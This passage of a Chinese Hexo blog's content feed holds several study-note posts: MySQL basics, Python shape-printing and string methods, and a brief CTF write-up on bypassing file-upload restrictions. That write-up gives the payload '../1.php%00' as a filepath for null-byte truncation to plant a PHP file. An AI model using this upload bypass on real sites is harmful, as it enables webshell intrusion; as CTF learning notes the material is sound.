https://github.com/username/scholar10.github.io.git</span><br><span class="line">branch: master</span><br></pre></td></tr></table></figure><p>类型配置为git 仓库地址为 建立的github仓库地址(scholar10替换成自己的)分支为master也就是主分支</p><p>然后执行部署命令 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo deploy 简写 hexo g -d //生成静态文件后提交到github上</span><br></pre></td></tr></table></figure><p>执行完成后 别人就可以通过 </p><p><a href="http://scholar10.github.io" target="_blank" rel="noopener">http://scholar10.github.io</a></p><p>访问你的博客了</p>]]></content>
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 静态博客 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>MySql笔记</title>
      <link href="/2019/02/12/MySql%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/02/12/MySql%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p><img src="https://i.loli.net/2019/03/05/5c7dd0ef8f6a0.png" alt="屏幕快照 2019-03-05 上午9.28.47.png"></p><p>又很久没有写博客了 这篇笔记是边学边记的 当时比较仓促 所以有的地方可能会比较乱 但是大概的方法写的还是比较清楚了 等有时间回头再好好整理一下这篇文章。</p><a id="more"></a><h2 id="库操作"><a href="#库操作" class="headerlink" title="库操作"></a>库操作</h2><p>show darabases;    查询数据库</p><p>create database 数据库名;    创建数据库</p><p>show create database 数据库名; 查询数据库创建语句</p><p><img src="https://i.loli.net/2019/02/08/5c5d7e0bda4cd.png" alt="深度截图_选择区域_20190208210257.png"></p><p>修改数据库</p><p>​    说明：不能修改数据库名称，只能修改字符集和校对集</p><p>​    语句：alter database 数据库名 charset=新字符集 collate=新的校对集</p><p>​    注意：字符集和校对集是可以分开修改的，但是建议必须一起修改</p><p>​    查看校对集：show collation;     查看字符集：show charset;</p><p>drop database 数据库名;    删除数据库</p><p>use 数据库名；选择数据库</p><h2 id="表操作"><a href="#表操作" class="headerlink" title="表操作"></a>表操作</h2><p>创建表</p><p>Create table 表名(</p><p>​    字段名称1 字段属性（类型） 字段选项,</p><p>​    字段名称2 字段类型 字段选项,</p><p>……………………..</p><p>)表选项;</p><p> 表选项：表字符集和数据引擎</p><p>字符集：charset=utf8;</p><p>数据引擎：默认innodb，语法：engine=引擎</p><p>这里的话可能会比较难理解 </p><p><strong>有一段比较官方的解释</strong></p><p><strong>存储引擎也叫“表类型”，是指一个表中的数据以何种方式存放在文件或内存中。不同的存储引擎（表类型）提供不同的性能特性和可用功能。没有一种各方面都又具有最佳性能又具有各种功能的存储引擎。我们要做的是要根据数据的具体使用情形（需求）来选择合适的存储引擎，有的要读取速度快，有的要写入速度快，有的要具有高安全可靠性，有的要海量存储，等等。常用的存储引擎是innoDB（默认）和Myisam。</strong></p><p><img src="https://i.loli.net/2019/02/08/5c5d859add64b.png" alt="图片1.png"></p><p><strong>字段类型：当前字段中存储数据类型必须是一开始指定好。</strong> 一开始制定了int 数据就不能存储float</p><p><strong>字段选项：设置当前字段的一些选项-是否可以为空，是否是主键，是否是唯一键，是否加备注等。</strong></p><p><strong>Null|not null：是否可以为空</strong></p><p><strong>Default：是否有默认值</strong></p><p><strong>Auto_increment：是否可以自动增长，必须是数字，如：需要给每条数据一个编号，原因是数据内容可以重复，编号不能重复。</strong></p><p><strong>Primary key：设置主键，数据内容不能重复，在查询数据主查询条件，一个表中一个主键，一般都是id。</strong></p><p><strong>unique [key]：设定为唯一（键），即表中所有行的的数据在该字段中的值不能有重复。</strong></p><p><strong>Comment：设置备注，给当前字段设置说明</strong></p><p><img src="https://i.loli.net/2019/02/08/5c5d8dc4bbf40.png" alt="深度截图_选择区域_20190208220959.png"></p><p>可以看到成功创建了students表</p><p>查看表结构：desc 表名;</p><p>​            字段名        类型            是否为空     索引    默认值        其它</p><p><img src="https://i.loli.net/2019/02/08/5c5d97f5deb12.png" alt="深度截图_选择区域_20190208225332.png"></p><p>​            </p><p>drop table 表名;    删除表</p><p>查看所有表：show tables;</p><p>查看创建表语句：show create table 表名;</p><p>修改表名:    alter table 旧表名 rename to 新表名;</p><p>添加新字段：alter table 表名 add 新字段 字段类型 字段选项;</p><p>如下可见新增了字段address</p><p><img src="https://i.loli.net/2019/02/08/5c5d9b2635863.png" alt="深度截图_选择区域_20190208230708.png"></p><p>修改表字段（包括字段名）：</p><p>Alter table 表名 change 旧字段名 新字段名 新字段类型 新字段选项;</p><p>修改字段类型和选项：</p><p>Alter table 表名 modify 字段名 新字段类型 新字段选项;</p><p>删除字段：alter table 表名 drop 字段名;</p><h2 id="数据操作"><a href="#数据操作" class="headerlink" title="数据操作"></a>数据操作</h2><h3 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h3><p>当我们需要向数据库表中插入一条新记录时，就必须使用<code>INSERT</code>语句。</p><p>语句：insert into 表名 【(字段1，字段2，字段3，…..)】 values(值1，值2，值3，……);</p><p><img src="https://i.loli.net/2019/02/09/5c5e97e57454e.png" alt="深度截图_选择区域_20190209170525.png"></p><p>如果一个字段有默认值，那么在<code>INSERT</code>语句中也可以不出现</p><p>要注意，字段顺序不必和数据库表的字段顺序一致，但值的顺序必须和字段顺序一致。也就是说，可以写<code>INSERT INTO students (name, age, id, sex) ...</code>，但是对应的<code>VALUES</code>就得变成<code>(&#39;张三&#39;, 18, null, &#39;男&#39;)</code></p><p>还可以一次性添加多条记录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">insert into students (id,name,age,sex) values</span><br><span class="line">    -&gt; (null,&apos;李四&apos;,22,&apos;女&apos;),</span><br><span class="line">    -&gt; (null,&apos;王五&apos;,19,&apos;男&apos;),</span><br><span class="line">    -&gt; (null,&apos;马六&apos;,19,&apos;女&apos;);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/02/09/5c5e9a2042426.png" alt="深度截图_选择区域_20190209171504.png"></p><p>字段列表可以省略：省略后的数据必须对应上创建时字段顺序</p><h3 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h3><p>要更新数据库表中的记录，必须使用<code>UPDATE</code>语句。</p><p><code>UPDATE</code>语句的基本语法是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE &lt;表名&gt; SET 字段1=值1, 字段2=值2, ... WHERE ...;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/02/09/5c5ec8645efe5.png" alt="深度截图_选择区域_20190209203228.png"></p><p><code>WHERE</code>子句中写出需要更新的行的筛选条件<code>id=1</code>：</p><p>因此利用<code>WHERE</code>我们也可以一次更新多条记录：</p><p><code>UPDATE students SET name=&#39;大佬&#39;, score=77 WHERE id&gt;=2 AND id&lt;=4;</code></p><p>在<code>UPDATE</code>语句中，更新字段时可以使用表达式。例如，把所有20岁以下的年龄加上5岁：</p><p><img src="https://i.loli.net/2019/02/09/5c5ec9eaa7c65.png" alt="深度截图_gnome-terminal-server_20190209203900.png"></p><h3 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h3><p>如果要删除数据库表中的记录，可以使用<code>DELETE</code>语句。</p><p><code>DELETE</code>语句的基本语法是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM &lt;表名&gt; WHERE ...;</span><br></pre></td></tr></table></figure><p>Where条件必须添加，否则删除所有数据</p><p>如果我们要删除students id=1的数据</p><p><img src="https://i.loli.net/2019/02/09/5c5ecc1809781.png" alt="深度截图_选择区域_20190209204804.png"></p><p>普通删除后保留删除的id号，不再让数据占用。</p><p><code>DELETE</code>语句的<code>WHERE</code>和<code>UPDATE</code>类似，同理<code>DELETE</code>也能利用<code>WHERE</code>也能一次删除多条记录：</p><p><code>DELETE FROM students WHERE id&gt;=2 AND id&lt;=4;</code></p><h3 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h3><p>前面多次使用过 这里就说说基本查询 以后有时间在扩展呀</p><p>要查询数据库表的数据，我们使用如下的SQL语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM &lt;表名&gt;</span><br></pre></td></tr></table></figure><p>使用<code>SELECT * FROM students</code>时，<code>SELECT</code>是关键字，表示将要执行一个查询，<code>*</code>表示“所有列”，<code>FROM</code>表示将要从哪个表查询，</p><p><strong>查询某些字段</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT name,age,sex,........ FROM &lt;表名&gt;`</span><br></pre></td></tr></table></figure><p>使用<code>SELECT *</code>表示查询表的所有列，使用<code>SELECT 列1, 列2, 列3</code>可以返回指定列，这种操作称为投影</p><p><strong>in语句:单独查询某些数据</strong></p><p>单独查询id=2 id=4的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from students where id in (2,4);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/02/09/5c5ee899900ff.png" alt="深度截图_选择区域_20190209224951.png"></p><p><strong>between语法：（表示该字段的值在给定的两个值之间，含该俩值）</strong></p><p>查询id=2到id=4的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from students where id between 2 and 4;</span><br></pre></td></tr></table></figure><p><strong>Like：模糊查询</strong></p><p>字段名 like ‘要查询的字符’;     如果是直接写字符，配置查询字符必须一致。</p><p>字段名 like ‘%要查询的字符%’;   %是匹配任何与之相似的字符</p><p>顾名思义 like=’像‘</p><p>可能有点难理解这里我创建了几条类似的数据</p><p><img src="https://i.loli.net/2019/02/09/5c5eef34b2686.png" alt="深度截图_选择区域_20190209231800.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from students where name like &apos;%大佬%&apos;;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/02/09/5c5eef6b3bd32.png" alt="深度截图_选择区域_20190209231901.png"></p><p>这样子应该会更好理解</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>边学边记录 虽然可能效率会比较低 但是印象会很深 等以后忘了还可以回头看看 </p><p>把大佬们当做目标 肝起来<img src="file:///C:\Users\jht\AppData\Local\Temp\SGPicFaceTpBq\1652\003F5F44.png" alt="img"> </p>]]></content>
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>常见的突破上传姿势</title>
      <link href="/2018/12/27/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AA%81%E7%A0%B4%E4%B8%8A%E4%BC%A0%E5%A7%BF%E5%8A%BF/"/>
      <url>/2018/12/27/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AA%81%E7%A0%B4%E4%B8%8A%E4%BC%A0%E5%A7%BF%E5%8A%BF/</url>
      <content type="html"><![CDATA[<p>突破上传的姿势 在几个月前一个实战过程中登录后台有上传却无法 getshell 当时是懵逼的  但是自己并没有当回事 也没有深入理解 之后在打ctf的过程中 一道上传题 就是用到了这姿势 今天闲的蛋疼 练习ctf又遇到 才想起来要总结总结呀！！</p><p><img src="/2018/12/27/常见的突破上传姿势/1.jpg" alt=""></p><a id="more"></a><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>这里拿一道ctf题举例</p><p><img src="/2018/12/27/常见的突破上传姿势/2.jpg" alt=""></p><h3 id="上传突破"><a href="#上传突破" class="headerlink" title="上传突破"></a>上传突破</h3><p>写文件需要路径 就是目录+文件名 </p><p>filepath+filenme</p><p>现在我们把filepath改成  ../1.php%00，%00后的那部分iflenname被截断了，后端则会认为../是目录 1.php是文件名 成功突破拿到flag</p><p><img src="/2018/12/27/常见的突破上传姿势/3.jpg" alt=""></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>依旧的是特别水的文章 不过也记录了自己学习的过程 几年后成为大佬来看这些文章回忆青春 哈哈哈 扯远了 现在的问题还是学习效率低 继续加油！！</p>]]></content>
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python打印各种图形</title>
      <link href="/2018/12/22/Python%E6%89%93%E5%8D%B0%E5%90%84%E7%A7%8D%E5%9B%BE%E5%BD%A2/"/>
      <url>/2018/12/22/Python%E6%89%93%E5%8D%B0%E5%90%84%E7%A7%8D%E5%9B%BE%E5%BD%A2/</url>
      <content type="html"><![CDATA[<p>看国光哥的博客发现他发了一篇c语言打印各种图形 然后自己最近在学python发现这是</p><p>很锻炼萌新思维的一些题 然后就想用python写一下总结的时候发现循环这一块理解的并不是很到位</p><p><img src="/2018/12/22/Python打印各种图形/0.jpg" alt=""></p><a id="more"></a><h3 id="直角三角形"><a href="#直角三角形" class="headerlink" title="直角三角形"></a>直角三角形</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for i in range(10):</span><br><span class="line">for j in range(i+1):</span><br><span class="line">print(&apos;*&apos;,end=&quot; &quot;)</span><br><span class="line">print()</span><br></pre></td></tr></table></figure><p><img src="/2018/12/22/Python打印各种图形/1.jpg" alt=""></p><h3 id="直角三角形旋转90°"><a href="#直角三角形旋转90°" class="headerlink" title="直角三角形旋转90°"></a>直角三角形旋转90°</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for i in range(10,0,-1):</span><br><span class="line">for j in range(i-1):</span><br><span class="line">print(&apos;*&apos;,end=&quot; &quot;)</span><br><span class="line">print()</span><br></pre></td></tr></table></figure><p><img src="/2018/12/22/Python打印各种图形/2.jpg" alt=""></p><h3 id="直角三角形旋转180°"><a href="#直角三角形旋转180°" class="headerlink" title="直角三角形旋转180°"></a>直角三角形旋转180°</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for i in range(1,10):</span><br><span class="line">    for j in range(1,i):</span><br><span class="line">        print(&quot; &quot;,end=&quot; &quot;)</span><br><span class="line">    for k in range(10,i,-1):</span><br><span class="line">        print(&quot;*&quot;,end=&quot; &quot;)</span><br><span class="line">    print()</span><br></pre></td></tr></table></figure><p><img src="/2018/12/22/Python打印各种图形/3.jpg" alt=""></p><h3 id="直角三角形旋转270°"><a href="#直角三角形旋转270°" class="headerlink" title="直角三角形旋转270°"></a>直角三角形旋转270°</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for i in range(1,10):</span><br><span class="line">    for j in range(9,i,-1):</span><br><span class="line">        print(&quot; &quot;,end=&quot; &quot;)</span><br><span class="line">    for k in range(1,i):</span><br><span class="line">        print(&quot;*&quot;,end=&quot; &quot;)</span><br><span class="line">    print()</span><br></pre></td></tr></table></figure><p><img src="/2018/12/22/Python打印各种图形/4.jpg" alt=""></p><h3 id="等腰三角形"><a href="#等腰三角形" class="headerlink" title="等腰三角形"></a>等腰三角形</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for i in range(10):</span><br><span class="line">    for j in range(0, 10 - i):</span><br><span class="line">        print(end=&quot; &quot;)</span><br><span class="line">    for k in range(10 - i, 10):</span><br><span class="line">        print(&quot;*&quot;, end=&quot; &quot;)</span><br><span class="line"></span><br><span class="line">    print(&quot;&quot;)</span><br></pre></td></tr></table></figure><p><img src="/2018/12/22/Python打印各种图形/5.jpg" alt=""></p><h3 id="等腰三角形旋转90°"><a href="#等腰三角形旋转90°" class="headerlink" title="等腰三角形旋转90°"></a>等腰三角形旋转90°</h3><p>这里用的是用的直角三角形和选择转90°的直角三角形</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">for i in range(10):</span><br><span class="line">    for j in range(0, i):</span><br><span class="line">        print(&apos;*&apos;,end=&quot; &quot;)</span><br><span class="line">    print()</span><br><span class="line">for i in range(10):</span><br><span class="line">    for j in range(10, i,-1):</span><br><span class="line">        print(&apos;*&apos;,end=&quot; &quot;)</span><br><span class="line">    print()</span><br></pre></td></tr></table></figure><p><img src="/2018/12/22/Python打印各种图形/6.jpg" alt=""></p><h3 id="等腰三角形旋转180°"><a href="#等腰三角形旋转180°" class="headerlink" title="等腰三角形旋转180°"></a>等腰三角形旋转180°</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for i in range(10):</span><br><span class="line">    for j in range(0,i):</span><br><span class="line">        print(end=&quot; &quot;)</span><br><span class="line">    for k in range(0, 10-i):</span><br><span class="line">        print(&quot;*&quot;, end=&quot; &quot;)</span><br><span class="line"></span><br><span class="line">    print(&quot;&quot;)</span><br></pre></td></tr></table></figure><p><img src="/2018/12/22/Python打印各种图形/7.jpg" alt=""></p><h3 id="等腰三角形旋转270"><a href="#等腰三角形旋转270" class="headerlink" title="等腰三角形旋转270"></a>等腰三角形旋转270</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">for i in range(10):</span><br><span class="line">    for j in range(9,i,-1):</span><br><span class="line">        print(&quot; &quot;,end=&quot; &quot;)</span><br><span class="line">    for k in range(0, i):</span><br><span class="line">        print(&quot;*&quot;,end=&quot; &quot;)</span><br><span class="line">    </span><br><span class="line">    print()</span><br><span class="line">for i in range(10):</span><br><span class="line">    for j in range(0,i):</span><br><span class="line">        print(&quot; &quot;,end=&quot; &quot;)</span><br><span class="line">    for k in range(9, i,-1):</span><br><span class="line">        print(&quot;*&quot;,end=&quot; &quot;)</span><br><span class="line">    </span><br><span class="line">    print()</span><br></pre></td></tr></table></figure><p><img src="/2018/12/22/Python打印各种图形/8.jpg" alt=""></p><h3 id="菱形"><a href="#菱形" class="headerlink" title="菱形"></a>菱形</h3><p>原等腰三角形和旋转180°的等腰三角形加在一起即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">for i in range(10):</span><br><span class="line">    for j in range(0, 10 - i):</span><br><span class="line">        print(end=&quot; &quot;)</span><br><span class="line">    for k in range(10 - i, 10):</span><br><span class="line">        print(&quot;*&quot;, end=&quot; &quot;)</span><br><span class="line"></span><br><span class="line">    print(&quot;&quot;)</span><br><span class="line"></span><br><span class="line">for i in range(10):</span><br><span class="line">    for j in range(0,i):</span><br><span class="line">        print(end=&quot; &quot;)</span><br><span class="line">    for k in range(0, 10-i):</span><br><span class="line">        print(&quot;*&quot;, end=&quot; &quot;)</span><br><span class="line"></span><br><span class="line">    print(&quot;&quot;)</span><br></pre></td></tr></table></figure><p><img src="/2018/12/22/Python打印各种图形/9.jpg" alt=""></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过打印以上各种图形 感觉对for的理解更深刻了 明天会更好 真好</p>]]></content>
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python字符串方法总结</title>
      <link href="/2018/12/18/Python%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
      <url>/2018/12/18/Python%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p><img src="/2018/12/18/Python字符串方法总结/1.jpg" alt=""></p><p>又是一篇菜鸡笔记 在学校很多毫无意义的事情要忙没那么多时间 自己学习效率也有待提高 今天正好有时间 加上课上也讲到了这些东西 还是比较难记的 所以总结一下 没有多少时间了 加油呀</p><a id="more"></a><h3 id="str-strip"><a href="#str-strip" class="headerlink" title="str.strip()"></a>str.strip()</h3><p>清除字符串两端的空格 较常用</p><h3 id="str-capitalize"><a href="#str-capitalize" class="headerlink" title="str.capitalize()"></a>str.capitalize()</h3><p>将首字符转换成大写 如果首字符没有大写形式 就返回原字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;xhy&apos;.capitalize()</span><br><span class="line">&apos;Xhy&apos;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="str-title"><a href="#str-title" class="headerlink" title="str.title()"></a>str.title()</h3><p>将字符串中每个首字母 大写。判断每个单词的依据则是基于空格和标点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;scholar xhy&apos;.title()</span><br><span class="line">&apos;Scholar Xhy&apos;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="str-lower"><a href="#str-lower" class="headerlink" title="str.lower()"></a>str.lower()</h3><p>将字符串转换为小写  仅对ascii编码的字母有效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;XHY&apos;.lower()</span><br><span class="line">&apos;xhy&apos;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="str-upper"><a href="#str-upper" class="headerlink" title="str.upper()"></a>str.upper()</h3><p>将字符串转换为大写 会自动忽略不可转换成大写的字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;scholar10&apos;.upper()</span><br><span class="line">&apos;SCHOLAR10&apos;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="str-center"><a href="#str-center" class="headerlink" title="str.center()"></a>str.center()</h3><p>将字符串按照给定的宽度居中显示，可以给定特殊的字符 填充多余的长度 如果指定长度小于字符串长度 则返回原字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;12345&apos;.center(10,&quot;*&quot;)</span><br><span class="line">&apos;**12345***&apos;</span><br></pre></td></tr></table></figure><h3 id="str-count"><a href="#str-count" class="headerlink" title="str.count()"></a>str.count()</h3><p>统计指定字符串 在原字符串中的个数 </p><p>str.count()可以指定查询字符串的起止位置</p><p>如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; test=&apos;Scholars work very hard&apos;</span><br><span class="line">&gt;&gt;&gt; test.count(&apos;a&apos;)</span><br><span class="line">2</span><br><span class="line">&gt;&gt;&gt; test.count(&apos;a&apos;,5,8)</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h4 id="检验邮箱格式是否正确"><a href="#检验邮箱格式是否正确" class="headerlink" title="检验邮箱格式是否正确"></a>检验邮箱格式是否正确</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">email=input(&quot;请输入email邮箱&quot;)</span><br><span class="line">if email.count(&quot;@&quot;)==1:</span><br><span class="line">    </span><br><span class="line">    if email.count(&quot;.&quot;)&gt;=1:</span><br><span class="line">        print(&quot;格式正确&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;邮箱应包含.&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;邮箱中应包含@&quot;)</span><br></pre></td></tr></table></figure><h3 id="str-find-str-rfind"><a href="#str-find-str-rfind" class="headerlink" title="str.find() str.rfind()"></a>str.find() str.rfind()</h3><p>从字符串左边或右边查找指定元素出现的索引位置 也可以指定 查找的起止范围 要查找的元素不存在时 返回-1</p><p><strong>(不论左边还是右边查找得到的结果都是字符串左边数起的)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; text = &apos;puter protective covering&apos;</span><br><span class="line">&gt;&gt;&gt; text.find(&apos;er&apos;)</span><br><span class="line">3</span><br><span class="line">&gt;&gt;&gt; text.find(&apos;sc&apos;)</span><br><span class="line">-1</span><br><span class="line">&gt;&gt;&gt; text.find(&apos;er&apos;,3)</span><br><span class="line">3</span><br></pre></td></tr></table></figure><h3 id="str-index-str-rindex"><a href="#str-index-str-rindex" class="headerlink" title="str.index() str.rindex()"></a>str.index() str.rindex()</h3><p>与 str.find() str.rfind()类似 不同的是如果要查找的元素不存在 则会引发ValueError</p><h3 id="str-replice"><a href="#str-replice" class="headerlink" title="str.replice()"></a>str.replice()</h3><p>str.replice(old,new,count)</p><p>用新字符串代替旧字符串 可以指定替换次数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; text = &apos;qwe asd kkk lll qwe&apos;</span><br><span class="line">&gt;&gt;&gt; text.replace(&apos;qwe&apos;,&apos;scholar&apos;)</span><br><span class="line">&apos;scholar asd kkk lll scholar&apos;</span><br><span class="line">&gt;&gt;&gt; text.replace(&apos;qwe&apos;,&apos;scholar&apos;,1)</span><br><span class="line">&apos;scholar asd kkk lll qwe&apos;</span><br></pre></td></tr></table></figure><h3 id="str-endswith-str-startswith"><a href="#str-endswith-str-startswith" class="headerlink" title="str.endswith() str.startswith()"></a>str.endswith() str.startswith()</h3><p>判断字符串是否以某个指定的字符串 开头或结尾 返回布尔值 可指定查找的起止范围</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a=&quot;Scholars work very hard&quot;</span><br><span class="line">&gt;&gt;&gt; a.endswith(&apos;rd&apos;)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; a.startswith(&quot;Sc&quot;)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><h3 id="str-split"><a href="#str-split" class="headerlink" title="str.split()"></a>str.split()</h3><p>使用指定的字符将整个字符串拆分为若干个元素 并返回一个列表 ，默认没有参数时 拆分符为空格符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;1,2,3&apos;.split(&apos;,&apos;)</span><br><span class="line">[&apos;1&apos;, &apos;2&apos;, &apos;3&apos;]</span><br><span class="line">&gt;&gt;&gt; &apos;i love python&apos;.split()</span><br><span class="line">[&apos;i&apos;, &apos;love&apos;, &apos;python&apos;]</span><br></pre></td></tr></table></figure><h3 id="str-isdigit"><a href="#str-isdigit" class="headerlink" title="str.isdigit()"></a>str.isdigit()</h3><p>isdigit() 方法检测字符串是否只由数字组成 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; str = &apos;123&apos;</span><br><span class="line">&gt;&gt;&gt; str.isdigit()</span><br><span 